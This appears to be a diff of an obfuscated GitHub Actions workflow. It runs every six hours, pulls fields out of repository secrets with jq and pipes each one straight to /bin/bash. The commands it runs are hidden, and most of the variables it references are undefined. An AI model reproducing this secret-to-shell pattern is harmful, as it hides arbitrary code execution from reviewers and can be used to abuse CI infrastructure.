@@ -3,8 +3,7 @@ name: pubianpxx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
-
+    - cron: '33 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,25 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: pubianpxx
         env:
-          agt4: ${{ secrets.agt4 }}
+          hzc877: ${{ secrets.hzc877 }}
         run: |
-          echo $agt4 | jq -r .enbtt137 | /bin/bash
-          echo $aksw6404 | jq -r .k88 | /bin/bash
-          echo $aw565 | jq -r .mkcru26 | /bin/bash
-          echo $ajsl3 | jq -r .f30 | /bin/bash
-          echo $qo93 | jq -r .kqzbu3 | /bin/bash
-          echo $g28009 | jq -r .cce6661 | /bin/bash
-          echo $owaf98 | jq -r .w89 | /bin/bash
-          echo $mtdza3435 | jq -r .lt61 | /bin/bash
-          echo $i842 | jq -r .p87 | /bin/bash
-          echo $nacvl17 | jq -r .omcs24629 | /bin/bash
-          echo $r986 | jq -r .xmsf74 | /bin/bash
-          echo $meev626 | jq -r .iu966 | /bin/bash
-          echo $yq2197 | jq -r .btq0715 | /bin/bash
-          echo $acyqw98581 | jq -r .s2142 | /bin/bash
-          echo $tzbb6169 | jq -r .gln9 | /bin/bash
-          echo $it57049 | jq -r .hwq3779 | /bin/bash
-          echo $m04 | jq -r .abtkw06 | /bin/bash
-          echo $sqb9768 | jq -r .uie74104 | /bin/bash
-          echo $h2503 | jq -r .fkv772 | /bin/bash
+          echo $hzc877 | jq -r .bgsc37 | /bin/bash
+          echo $jp0716 | jq -r .p6 | /bin/bash
+          echo $mmv8777 | jq -r .fm765 | /bin/bash
+          echo $wcxnv68 | jq -r .n8351 | /bin/bash
+          echo $fr02926 | jq -r .szj29 | /bin/bash
+          echo $yczr53 | jq -r .mo3 | /bin/bash
+          echo $tvcg7 | jq -r .vcel8 | /bin/bash
+          echo $cja4 | jq -r .vopp817 | /bin/bash
+          echo $az7736 | jq -r .ujf72463 | /bin/bash
+          echo $zph8 | jq -r .frqli4 | /bin/bash
+          echo $gqg2 | jq -r .fnvn3 | /bin/bash
 
